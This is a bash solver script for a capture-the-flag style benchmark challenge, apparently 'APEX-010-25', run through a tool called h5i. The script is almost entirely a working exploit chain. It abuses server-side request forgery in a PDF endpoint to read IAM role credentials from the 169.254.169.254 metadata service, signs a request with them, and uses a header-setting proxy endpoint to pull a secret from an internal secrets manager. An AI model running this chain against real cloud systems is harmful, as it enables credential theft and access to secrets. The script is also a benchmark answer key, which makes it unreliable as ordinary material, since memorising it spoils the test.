#!/usr/bin/env bash
# APEX-010-25 — "SSRF to Cloud Secrets" (tags: ssrf, cloud, chain)
#
# Four steps, each one only reachable from the last. `/api/generate-pdf` fetches
# a URL server-side, and the address it can reach that nobody outside can is
# `169.254.169.254`, the instance metadata service. That names the IAM role;
# the role names its temporary credentials; the credentials sign a request; and
# `/api/proxy`, which lets the caller set headers, carries the signature to the
# secrets manager on the internal network.
#
# The interesting h5i property here is that the chain is four ordinary replays
# of one captured request. Nothing about a multi-step exploit needs a different
# verb: the difference between step one and step four is which JSON fields are
# bent, and every hop is in the same audit afterwards.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex010-$$"
METADATA="http://169.254.169.254/latest/meta-data/iam/security-credentials"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

body() { python3 -c 'import sys; sys.stdout.write(sys.stdin.read().split("\n\n", 1)[-1])'; }

fetch() {
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/api/generate-pdf \
        --set header.Content-Type=application/json \
        --set "json.url=$1" | body |
        python3 -c 'import json,sys; print(json.load(sys.stdin).get("content",""))'
}

"$H5I" browser open "$URL/" --session "$SESSION" --new --capture >/dev/null

ROLE="$(fetch "$METADATA/" | tr -d '[:space:]')"
CREDENTIALS="$(fetch "$METADATA/$ROLE")"

# The signature this secrets manager checks is its own shape, not real SigV4:
# HMAC-SHA256 of `key:date:path` under the secret key.
read -r AUTH AMZ_DATE TOKEN <<<"$(python3 - <<PY
import datetime, hashlib, hmac, json
creds = json.loads("""$CREDENTIALS""")
key, secret = creds["AccessKeyId"], creds["SecretAccessKey"]
now = datetime.datetime.now(datetime.timezone.utc)
day = now.strftime("%Y%m%d")
path = "/v1/secret/flag"
signature = hmac.new(secret.encode(), f"{key}:{day}:{path}".encode(),
                     hashlib.sha256).hexdigest()
print("AWS4-HMAC-SHA256|Credential=%s/%s/us-east-1/secretsmanager/aws4_request,|"
      "SignedHeaders=host;x-amz-date,|Signature=%s" % (key, day, signature),
      now.strftime("%Y%m%dT%H%M%SZ"), creds.get("Token", ""))
PY
)"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/api/proxy \
    --set header.Content-Type=application/json \
    --set 'json.url=http://secrets-manager:8080/v1/secret/flag' \
    --set json.method=GET \
    --set "json.headers.Authorization=${AUTH//|/ }" \
    --set "json.headers.X-Amz-Date=$AMZ_DATE" \
    --set "json.headers.X-Amz-Security-Token=$TOKEN" |
    flag
